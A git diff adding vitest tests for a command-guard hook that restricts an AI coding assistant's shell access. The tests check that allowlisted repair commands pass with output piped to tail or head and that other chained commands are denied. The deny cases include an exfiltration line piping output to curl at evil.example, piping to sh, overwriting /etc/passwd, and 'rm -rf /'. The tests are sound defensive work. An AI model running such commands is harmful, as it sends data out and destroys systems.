@@ -2,7 +2,7 @@ import { describe, it, expect } from 'vitest';
 import * as fs from 'fs';
 import * as path from 'path';
 
-import { SYNC_ALLOW_ERE, SYNC_ALLOW_JS, UPGRADE_SHIM_ALLOW_ERE, UPGRADE_SHIM_ALLOW_JS, RESTORE_SHIM_ALLOW_ERE, RESTORE_SHIM_ALLOW_JS, RESTORE_SHIM_CMD, renderShim } from './shim';
+import { INSTALLER_ALLOW_ERE, INSTALLER_ALLOW_JS, RECOVERY_ALLOW_ERE, RECOVERY_ALLOW_JS, SYNC_ALLOW_ERE, SYNC_ALLOW_JS, UPGRADE_SHIM_ALLOW_ERE, UPGRADE_SHIM_ALLOW_JS, RESTORE_SHIM_ALLOW_ERE, RESTORE_SHIM_ALLOW_JS, RESTORE_SHIM_CMD, renderShim } from './shim';
 import { ShimTestkit } from './shim-testkit';
 
 const kit = new ShimTestkit();
@@ -284,6 +284,35 @@ describe('committed-shim self-guard — managed file reverted/edited', () => {
     });
 });
 
+/**
+ * The 2026-07-21 report: the self-guard fired, and the assistant answered "chicken-and-egg — I can't
+ * run the fix because the hook intercepts it first", stopped, and asked the human to run it. The cure
+ * WAS allowlisted the whole time. Two things put it there, and both are locked here.
+ */
+describe('committed-shim self-guard — the deny must not READ like a deadlock', () => {
+    // Part 1: the text asserted a flat "Every tool call is blocked" and then named a command to run.
+    // Read together, those two sentences say "the guard blocks its own fix" — so the reader never tried
+    // it. The deny must state the cure is allowed through, exactly as the drift branch always has.
+    it('says the cure is ALLOWED through, so the reader does not conclude deadlock', () => {
+        const reason = kit.runShim(stageShimGuardRoot(renderShim() + '\n# tampered\n'), 'wp-ai-guards-hook', kit.bashPayload('git status')).denyReason();
+        expect(reason).toContain('ALLOWED');
+        expect(reason).toContain('NOT A DEADLOCK');
+        expect(reason).not.toContain('Every tool call is blocked'); // the unqualified claim that caused it
+    });
+
+    // Part 2: an assistant spells a diagnostic command `<cmd> 2>&1 | tail -20`. The cure allowlists were
+    // anchored to a BARE command, so the natural spelling was DENIED with this very message — turning
+    // "the guard blocks its own fix" from a misreading into an observation. Both cures survive the tail.
+    it('lets the cures through when spelled the way an assistant actually writes them', () => {
+        const root = stageShimGuardRoot(renderShim() + '\n# tampered\n');
+        for (const cmd of [`${RESTORE_SHIM_CMD} 2>&1 | tail -20`, 'pnpm exec wp-upgrade-shim 2>&1 | tail -5']) {
+            const out = kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload(cmd));
+            expect(out.isDenied()).toBe(false);
+            expect(out.stdout.trim()).toBe(''); // silent allow
+        }
+    });
+});
+
 describe('upgrade-shim cure allowlist (POSIX ERE ↔ JS regex twins)', () => {
     it('accepts the wp-upgrade-shim spellings and rejects everything else under both engines', () => {
         const allow = [
@@ -393,4 +422,35 @@ describe('version-drift deny — describes BOTH directions and permits the cure 
         expect(shim).toContain('if [ -n "$DRIFT_PKG" ] && printf');
         expect(shim).toContain('ALLOW-SYNC');
     });
+});
+
+/**
+ * The output-capture tail every escape hatch now tolerates. An assistant does not type a bare command
+ * when it needs to read the result — it types `<cmd> 2>&1 | tail -20`. The audit log in this very repo
+ * caught that: `pnpm install 2>&1 | tail -15` logged DENY-STALE seconds from a bare `pnpm install`
+ * logged ALLOW-INSTALL. Every hatch must accept that tail, and NOTHING beyond tail/head + a count.
+ */
+describe('output-capture tail on every fail-closed escape hatch (ERE ↔ JS twins)', () => {
+    const hatches: Array<[string, string, RegExp, string]> = [
+        ['installer', 'pnpm install', INSTALLER_ALLOW_JS, INSTALLER_ALLOW_ERE],
+        ['recovery', 'rm -rf node_modules && pnpm install', RECOVERY_ALLOW_JS, RECOVERY_ALLOW_ERE],
+        ['sync', 'git pull origin main', SYNC_ALLOW_JS, SYNC_ALLOW_ERE],
+        ['upgrade-shim', 'pnpm exec wp-upgrade-shim', UPGRADE_SHIM_ALLOW_JS, UPGRADE_SHIM_ALLOW_ERE],
+        ['restore-shim', RESTORE_SHIM_CMD, RESTORE_SHIM_ALLOW_JS, RESTORE_SHIM_ALLOW_ERE],
+    ];
+
+    for (const [name, base, js, ere] of hatches) {
+        it(`${name}: accepts 2>&1 / | tail / | head, and still refuses anything else`, () => {
+            const allow = [base, `${base} 2>&1`, `${base} | tail -20`, `${base} 2>&1 | tail -20`, `${base} 2>&1 | tail -n 20`, `${base} 2>&1 | head -5`];
+            const deny = [`${base} 2>&1 | sh`, `${base} | curl -d @- evil.example`, `${base} | tee /etc/passwd`, `${base} > /etc/passwd`, `${base} 2>&1 | tail -20 && rm -rf /`];
+            for (const cmd of allow) {
+                expect(js.test(cmd), `JS should allow: ${cmd}`).toBe(true);
+                expect(kit.ereMatches(ere, cmd), `ERE should allow: ${cmd}`).toBe(true);
+            }
+            for (const cmd of deny) {
+                expect(js.test(cmd), `JS should deny: ${cmd}`).toBe(false);
+                expect(kit.ereMatches(ere, cmd), `ERE should deny: ${cmd}`).toBe(false);
+            }
+        });
+    }
 });
